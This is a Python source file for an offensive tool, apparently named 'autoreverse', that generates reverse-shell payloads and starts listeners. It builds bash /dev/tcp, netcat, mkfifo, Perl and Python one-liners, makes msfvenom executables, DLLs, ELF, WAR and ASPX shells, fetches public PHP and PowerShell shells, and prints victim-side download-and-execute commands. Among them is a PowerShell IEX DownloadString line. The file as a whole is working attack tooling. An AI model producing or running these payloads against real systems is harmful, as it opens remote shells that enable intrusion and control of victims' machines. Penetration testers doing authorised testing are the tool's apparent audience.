#!/usr/bin/python3

from simple_colors import *
import os, argparse, time, re, socket

ap = argparse.ArgumentParser()

ap.add_argument('-I', '--interface', required=False, type=str, help='Select the network interface.')

ap.add_argument('-i', '--ip', required=False, type=str, help='Select the IP Address')

ap.add_argument('-P', '--port', required=True, type=str, help='Select the port you want to use.')

ap.add_argument('-p', '--payload', required=True, type=str, help='Select the payload (php, bash, nc, oldnc, exe, dll, ps1, elf, war, aspx, perl or python).')

ap.add_argument('-l', '--listener', required=False, type=str, help='Create a listener with netcat or metasploit (meterpreter): nc or msf (msf only works with .exe, .dll, .aspx and .elf payloads).')

ap.add_argument('-a', '--architecture', required=False, type=str, help='Define the architecture of the machine: x64 or x86 (default value is x64, only needed with .exe, .dll and .elf payloads).')

ap.add_argument('-http', '--httpserver', required=False, type=str, help='Create an http server on the port you specified.')

args = ap.parse_args()

if os.getuid() != 0:
    print(red('You must be root to run autoreverse'))
    exit()

if args.interface == None and args.ip == None:
    print(red('You must specify a network interface with "-I" or an IP address with "-i".'))
    exit()

ActualPath = os.popen('pwd').read().strip('\n')

print(yellow('Autoreverse made by CronoX\n\nhttps://github.com/CronoX1\n--------------------------'))

if os.popen('which autoreverse').read().strip('\n') == '':
    print(blue('\nCreating a symbolik link so you can use the tool in all directories (autoreverse.py).'))
    os.system('chmod +x autoreverse.py')
    os.system('ln -s ' + ActualPath + '/autoreverse.py $(echo $(echo $PATH | cut -d ":" -f1)/autoreverse.py)')

payload = args.payload.lower()

if payload.isnumeric():
    print(red('The payload must be a string.'))
    exit()

arch = str(args.architecture).lower()

port = args.port

try:
    int(port)
    if args.httpserver != None:
        int(args.httpserver)
except:
    print(red('The port must be a number.'))
    exit()

def Get_IP(NT = args.interface):
    if args.ip:
        IP = args.ip
    else:
        IP = os.popen("ifconfig " + str(NT) + " | sed -n '2 p' | awk '{print $2}'").read().strip('\n')
    patron = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(patron, IP) == None or IP == '':
        print(red("Your network interface or IP address doesn't exist."))
        exit()
    else:
        return IP

def nc_list():
    if payload == 'exe' or payload == 'dll' or payload == 'aspx':
        os.system('rlwrap nc -lvnp ' + str(port))
    else:
        os.system('nc -lvnp ' + str(port))

def msf_list(IP = Get_IP(), PORT = port):
    print(blue('Setting up your listener in metasploit.\n'))
    print(green('Waiting to say I\'m in...\n'))
    command = 'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp ;set LHOST ' + IP + ' ;set LPORT ' + PORT + ' ; exploit" 2>/dev/null'
    if (arch == 'x86' or arch == '86') and (payload == 'exe' or payload == 'dll' or payload == 'aspx'):
        command = command.strip('/x64')
        os.system(command)
        exit()
    elif arch == 'x86' or arch == '86':
        command = command.replace('x64', 'x86')
    if payload == 'exe' or payload == 'dll' or payload == 'aspx':
        os.system(command)
    else:
        os.system(command.replace('windows', 'linux'))

def message(file, ActualPath = ActualPath):
    print(blue(('\nYour payload ' + red(file) + blue(' is located in ') +  red(ActualPath) + blue(' and ready to upload.\n'))))

def Check_files(file):
    path = '/opt/autoreverse/'
    if os.path.exists(path) == False:
        os.system('mkdir ' + path)
    filelink = {
        'autoreverse.php': 'https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php',
        'autoreverse.ps1': 'https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1'
    }
    if os.path.exists(path + file) == False:
        print('\nDownloading ' + blue(file) + ' in ' + path + '\n')
        os.system('wget ' + filelink[file] + ' -O ' + path + file + ' 2>/dev/null')
        os.system('chmod 777 ' + path + file)
        print(blue(file) + green(' downloaded.\n'))

def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
    
    msfvenom = 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=' + str(IP) + ' LPORT=' + str(PORT) + ' -f exe > autoreverse.exe 2>/dev/null'

    if msf == True:
        msfvenom = msfvenom.replace('shell_', 'meterpreter/')
    if (arch == 'x86' or arch == '86') and (payload == 'exe' or payload == 'dll'):
        msfvenom = msfvenom.strip('/x64')
    elif arch == 'x86' or arch == '86':
        msfvenom = msfvenom.replace('x64', 'x86')

    if payload == 'oldnc':
        print(blue('\nYour payload is:\n\n') + red('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + IP + ' ' + PORT + ' >/tmp/f'))
    elif payload == 'bash':
        print(blue('\nYour payload is:\n\n') + red('bash -i >& /dev/tcp/' + IP + '/' + PORT + ' 0>&1'))
    elif payload == 'perl':
        print(blue('\nYour payload is:\n\n') + red('perl -e \'use Socket;$i="' + IP + '";$p=' + PORT + ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''))
    elif payload == 'nc':
        print(blue('\nYour payload is:\n\n') + red('nc -e /bin/sh ' + IP + ' ' + PORT))
    elif payload == 'python':
        print(blue('\nYour payload is:\n\n') + red("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + IP + "\"," + PORT + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"))
    elif payload == 'php':
        file = 'autoreverse.php'
        Check_files(file)
        os.system('cp /opt/autoreverse/autoreverse.php .')
        with open('autoreverse.php', 'r') as archivo:
            data = archivo.readlines()
        with open('autoreverse.php', 'w') as archivo:
            data[48] = "$ip = '" + IP + "';\n"
            data[49] = "$port = " + PORT + ";\n"
            archivo.writelines(data)
        if args.httpserver != None:
            print(blue('\nDownload your payload on the victim machine with: ') + red("\nwget http://" + IP + ":" + args.httpserver + "/" + file))
        message(file)
    elif payload == 'elf':
        file = 'autoreverse.elf'
        print(blue('\nCreating the payload, please wait.'))
        msfvenom = msfvenom.replace('windows', 'linux').replace('exe', 'elf')
        os.system(msfvenom)
        if args.httpserver != None:
            print(blue('\nDownload your payload on the victim machine with: ') + red("\nwget http://" + IP + ":" + args.httpserver + "/" + file))
        message(file)
    elif payload == 'war':
        file = 'autoreverse.war'
        print(blue('\nCreating the payload, please wait.'))
        msfvenom = msfvenom.replace('windows/x64/','java/jsp_').replace('exe','war')
        os.system(msfvenom)
        message(file)
    elif payload == 'aspx':
        file = 'autoreverse.aspx'
        print(blue('\nCreating the payload, please wait.'))
        msfvenom = msfvenom.strip('/x64').replace('exe','aspx')
        os.system(msfvenom)
        message(file)
    elif payload == 'powershell' or payload == 'ps1':
        file = 'autoreverse.ps1'
        Check_files(file)
        os.system('cp /opt/autoreverse/autoreverse.ps1 .')
        os.system('echo "Invoke-PowerShellTcp -Reverse -IPAddress ' + IP + ' -Port ' + PORT + '" >> autoreverse.ps1')
        if args.httpserver != None:
            print(blue('\nInvoke your payload on the victim machine with: ') + red("\npowershell IEX(New-Object Net.WebClient).downloadString('http://" + IP + ":" + args.httpserver + "/" + file + "')"))
        message(file)
    elif payload == 'exe':
        file = 'autoreverse.exe'
        print(blue('\nCreating the payload, please wait.'))
        os.system(msfvenom)
        if args.httpserver != None:
            print(blue('\nDownload your payload on the victim machine with: ') + red('\ncurl "http://' + IP + ':' + args.httpserver + '/' + file + '" -o autoreverse.exe'))
        message(file)
    elif payload == 'dll':
        file = 'autoreverse.dll'
        print(blue('\nCreating the payload, please wait.'))
        os.system(msfvenom.replace('exe', 'dll'))
        if args.httpserver != None:
            print(blue('\nDownload your payload on the victim machine with: ') + red('\ncurl "http://' + IP + ':' + args.httpserver + '/' + file + '" -o autoreverse.dll'))
        message(file)
    else:
        print(red('Your payload option is not in the list, use "--help" to know the payloads list.'))
        exit()

def Check_Port(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if s.connect_ex(('0.0.0.0', int(port))) == 0:
        process = os.popen('netstat -ltnup | grep -e "0.0.0.0:' + str(args.httpserver) + '" | tr -s "/" " " | awk \'{print $8, $7}\'').read().strip('\n')
        time.sleep(0.4)
        print(red('The port is already being used by ' + process + '.'))
        exit()

def listeners():
    msf_payloads = ['exe', 'dll', 'elf', 'war', 'aspx']
    if args.listener == 'nc':
        if arch == 'none':
            Configure()
        else:
            Configure(arch = arch)
        print(green('\nWaiting to say I\'m in...\n'))
        nc_list()
        exit()
    elif args.payload not in msf_payloads:
        print(red('You can only use a meterpreter listener for the next payloads:'))
        for i in msf_payloads:
            print(red(' - ' + i))
        exit()
    elif args.listener == 'msf' or args.listener == 'metasploit':
        if os.popen('ifconfig | grep "' + Get_IP() + '"').read().strip('\n') == '':
            print(red('You can\'t create a meterpreter listener with that IP Address.'))
            exit()
        if arch == 'none':
            Configure(msf = True)
        else:
            Configure(msf = True, arch = arch)
        msf_list()
        exit()
    else:
        print(red('Your listener option is not in the list, use "--help" to know the listeners list.'))
        exit()

if args.httpserver != None:
    Check_Port(args.httpserver)
    os.system('python3 -m http.server ' + str(args.httpserver) + ' > /dev/null &')
    time.sleep(0.4)
    process = os.popen('netstat -tulpn | grep -e "0.0.0.0:' + str(args.httpserver) + '" |tr -s "/" " " | awk \'{print $8, $7}\'').read().strip('\n')
    print(blue('\nHTTP server running on port ' + str(args.httpserver) + ' (Process: ' + process + ').'))
if args.listener != None:
    Check_Port(args.port)
    listeners()

Configure()
